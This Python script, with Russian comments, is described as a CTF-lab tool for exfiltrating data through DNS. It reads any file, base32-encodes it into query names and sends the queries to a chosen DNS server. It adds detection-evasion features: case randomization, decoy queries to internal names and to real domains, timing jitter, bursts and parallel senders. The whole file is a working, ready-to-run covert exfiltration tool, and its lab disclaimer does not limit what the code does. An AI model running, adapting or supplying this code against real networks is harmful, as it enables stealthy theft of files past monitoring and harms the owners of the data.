#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# DNS QNAME exfiltrator for CTF labs
# - multi-label per query (e.g. SEQ.<B32a>.<B32b>.<B32c>.zone)
# - optional noise (internal zone names + external domains)
# - parallel workers
# - duplicate sends per group
# - no recv() -> no blocking on responses
#
# Use ONLY in a controlled environment you own/are allowed to test.

import argparse, base64, os, random, socket, struct, sys, threading, time, re

# ----------------------------- low-level DNS -----------------------------

def encode_name(n: str) -> bytes:
    parts = n.strip('.').split('.')
    out = b''
    for p in parts:
        if not p:
            continue
        b = p.encode('ascii')
        if len(b) > 63:
            raise ValueError(f"DNS label too long (>63): {p[:70]}...")
        out += bytes([len(b)]) + b
    return out + b'\x00'  # root

def send_dns_query(name: str, server: str, qtype: int = 1, timeout=0.2):
    tid = random.randint(0, 0xFFFF)
    flags = 0x0100  # RD=1 обычный запрос (авторитативному не мешает)
    pkt = struct.pack('!HHHHHH', tid, flags, 1, 0, 0, 0)
    pkt += encode_name(name.lower())
    pkt += struct.pack('!HH', qtype, 1)  # QTYPE, QCLASS=IN

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(timeout)
    try:
        s.sendto(pkt, (server, 53))
        # не ждём ответ, чтобы не тормозить канал
        # если очень надо - раскомментируй:
        # try: s.recvfrom(4096)
        # except socket.timeout: pass
    finally:
        s.close()

# ----------------------------- helpers ----------------------------------

def b32_no_pad(b: bytes) -> str:
    return base64.b32encode(b).decode('ascii').rstrip('=')

def randcase(s: str) -> str:
    # 0x20 randomization: часть символов в нижний регистр
    out = []
    for ch in s:
        if 'A' <= ch <= 'Z' and (random.getrandbits(1) == 1):
            out.append(ch.lower())
        else:
            out.append(ch)
    return ''.join(out)

def jitter_sleep(ms_min: int, ms_max: int):
    if ms_min <= 0 and ms_max <= 0:
        return
    time.sleep(random.uniform(max(0, ms_min)/1000.0, max(0, ms_max)/1000.0))

def parse_pair(s: str, typ=int, default=(0,0)):
    try:
        a, b = s.split(',')
        return (typ(a), typ(b))
    except Exception:
        return default

# ----------------------------- noise ------------------------------------

QTYPE_POOL = [1, 28, 16, 15]  # A, AAAA, TXT, MX

INT_BASE_NAMES = [
    "www","api","cdn","img","static","assets","sso","auth",
    "ocsp","time","ntp","status","health","telemetry","edge","media","store","files"
]

EXT_DOMAINS = [
    "google.com","yandex.ru","microsoft.com",
    "cloudflare.com","github.com","cdn.jsdelivr.net","wikipedia.org"
]

def noise_name_internal(zone: str) -> str:
    zone = zone.rstrip('.') + '.'
    roll = random.random()
    if roll < 0.35:
        return f"cdn{random.randint(1,500)}.{zone}"
    if roll < 0.70:
        return f"img{random.randint(1,999)}.{zone}"
    if roll < 0.85:
        return f"static{random.randint(1,9)}.assets.{zone}"
    base = random.choice(INT_BASE_NAMES)
    if random.random() < 0.4:
        base = f"{base}{random.randint(1,99)}"
    return f"{base}.{zone}"

def send_internal_noise(server, zone, count_range=(0,0), qtype_pool=QTYPE_POOL, delay_ms=(10,40)):
    c = random.randint(*count_range)
    for _ in range(c):
        name = noise_name_internal(zone)
        qtype = random.choice(qtype_pool)
        send_dns_query(name, server, qtype=qtype)
        jitter_sleep(*delay_ms)

def send_external_noise(server, count_range=(0,0), delay_ms=(10,40)):
    c = random.randint(*count_range)
    for _ in range(c):
        name = random.choice(EXT_DOMAINS)
        qtype = random.choice([1, 28])
        send_dns_query(name, server, qtype=qtype)
        jitter_sleep(*delay_ms)

# ------------------------- grouping & safety -----------------------------

def b32_segments(data: bytes, seg_size: int):
    seg_size = max(1, min(63, seg_size))  # DNS label hard cap
    s = b32_no_pad(data)
    return [s[i:i+seg_size] for i in range(0, len(s), seg_size)]

def safe_segments_per_qname(zone: str, seg_size: int, desired: int, seq_width=5) -> int:
    """
    Подбирает безопасное кол-во data-лейблов в одном QNAME с учётом лимита ~253 символа.
    """
    zone = zone.rstrip('.')  # без финальной точки для текстовой длины
    seg_size = max(1, min(63, seg_size))
    # пробуем от desired вниз, пока влезаем
    for k in range(desired, 0, -1):
        labels = ['0'*seq_width] + ['A'*seg_size]*k + [zone]
        qname = '.'.join(labels)  # текстовая форма без trailing dot
        if len(qname) <= 250:     # запас к 253
            return k
    return 1

# ------------------------------ exfil ------------------------------------

class ExfilPlan:
    def __init__(self, zone: str, groups, server: str, opts):
        self.zone = zone.rstrip('.') + '.'
        self.groups = groups      # list[list[str]] of B32 labels per qname
        self.server = server
        self.opts = opts

def build_plan(server: str, zone: str, filepath: str,
               seg_size=60, seg_per_qname=3) -> ExfilPlan:
    data = open(filepath, 'rb').read()
    segs = b32_segments(data, seg_size=seg_size)
    seg_per_qname = safe_segments_per_qname(zone, seg_size, seg_per_qname)
    groups = [segs[i:i+seg_per_qname] for i in range(0, len(segs), seg_per_qname)]
    return ExfilPlan(zone, groups, server, None)

def send_group(idx: int, labels, plan: ExfilPlan, opts):
    # сформировать имя: SEQ.<b32a>.<b32b>...<zone>
    data_labels = '.'.join(randcase(x) for x in labels)
    qname = f"{idx:05d}.{data_labels}.{plan.zone}"
    # дубликаты запроса (для надёжности при дропах)
    for _ in range(opts['dup']):
        send_dns_query(qname, plan.server, qtype=1)
        jitter_sleep(5, 15)
    # шум вокруг
    if opts['noise_int'][1] > 0:
        send_internal_noise(plan.server, plan.zone, opts['noise_int'], delay_ms=(10,40))
    if opts['noise_ext'][1] > 0:
        send_external_noise(plan.server, opts['noise_ext'], delay_ms=(10,40))
    # задержка между группами
    if random.random() < opts['burst_prob']:
        jitter_sleep(1, 15)  # почти без паузы
    else:
        jitter_sleep(*opts['delay'])

def worker_thread(tid: int, k: int, plan: ExfilPlan, opts, start_idx=0):
    # round-robin по группам
    for i in range(tid, len(plan.groups), k):
        send_group(i, plan.groups[i], plan, opts)

def run_exfil(server, zone, filepath,
              seg_size=60, seg_per_qname=3,
              workers=1, dup=1,
              delay=(2,6), noise_int=(0,0), noise_ext=(0,0), burst_prob=0.05):
    seg_size = max(1, min(63, seg_size))
    seg_per_qname = max(1, seg_per_qname)

    plan = build_plan(server, zone, filepath, seg_size, seg_per_qname)
    opts = {
        'dup': max(1, dup),
        'delay': (max(0, delay[0]), max(0, delay[1])),
        'noise_int': (max(0, noise_int[0]), max(0, noise_int[1])),
        'noise_ext': (max(0, noise_ext[0]), max(0, noise_ext[1])),
        'burst_prob': max(0.0, min(1.0, burst_prob)),
    }
    plan.opts = opts

    # финальная информация
    print(f"[i] zone={zone.rstrip('.')}, server={server}")
    print(f"[i] file={filepath}, size={os.path.getsize(filepath)} bytes")
    print(f"[i] seg_size={seg_size}, requested seg_per_qname={seg_per_qname} -> actual={safe_segments_per_qname(zone, seg_size, seg_per_qname)}")
    print(f"[i] groups={len(plan.groups)}, workers={workers}, dup={dup}")
    print(f"[i] delay={delay} ms, noise_int={noise_int} per group, noise_ext={noise_ext} per group, burst_prob={burst_prob}")

    # потоки
    k = max(1, workers)
    threads = []
    t0 = time.time()
    for tid in range(k):
        th = threading.Thread(target=worker_thread, args=(tid, k, plan, opts), daemon=True)
        th.start()
        threads.append(th)
    for th in threads:
        th.join()
    # финальный маркер
    end = f"end.{len(plan.groups):05d}.{plan.zone}"
    send_dns_query(end, server, qtype=1)
    dt = time.time() - t0
    print(f"[+] done: sent {len(plan.groups)} groups in {dt:.2f}s (~{len(plan.groups)/max(dt,0.001):.1f} q/s)")

# ------------------------------ CLI --------------------------------------

def main():
    ap = argparse.ArgumentParser(description="DNS QNAME exfiltrator (CTF lab)")
    ap.add_argument('-s','--server', required=True, help='DNS server IP (authoritative)')
    ap.add_argument('-z','--zone', required=True, help='zone, e.g. eurotour.com')
    ap.add_argument('-f','--file', required=True, help='file to exfiltrate')

    ap.add_argument('--seg-size', type=int, default=60, help='b32 chars per label (<=63)')
    ap.add_argument('--segments', type=int, default=3, help='data labels per QNAME (auto-capped by 253-char rule)')
    ap.add_argument('--workers', type=int, default=1, help='parallel sender threads')
    ap.add_argument('--dup', type=int, default=1, help='duplicates per group (>=1)')

    ap.add_argument('--delay', default="2,6", help='ms between groups: MIN,MAX')
    ap.add_argument('--noise-int', default="0,0", help='internal noise per group: MIN,MAX')
    ap.add_argument('--noise-ext', default="0,0", help='external noise per group: MIN,MAX')
    ap.add_argument('--burst-prob', type=float, default=0.05, help='probability to use near-zero delay')

    args = ap.parse_args()

    delay = parse_pair(args.delay, int, (2,6))
    noise_int = parse_pair(args.noise_int, int, (0,0))
    noise_ext = parse_pair(args.noise_ext, int, (0,0))

    try:
        run_exfil(
            server=args.server, zone=args.zone, filepath=args.file,
            seg_size=args.seg_size, seg_per_qname=args.segments,
            workers=max(1, args.workers), dup=max(1, args.dup),
            delay=delay, noise_int=noise_int, noise_ext=noise_ext, burst_prob=args.burst_prob
        )
    except KeyboardInterrupt:
        print("\n[!] interrupted by user", file=sys.stderr)
        sys.exit(130)
    except Exception as e:
        print(f"[!] error: {e}", file=sys.stderr)
        sys.exit(1)

if __name__ == '__main__':
    main()
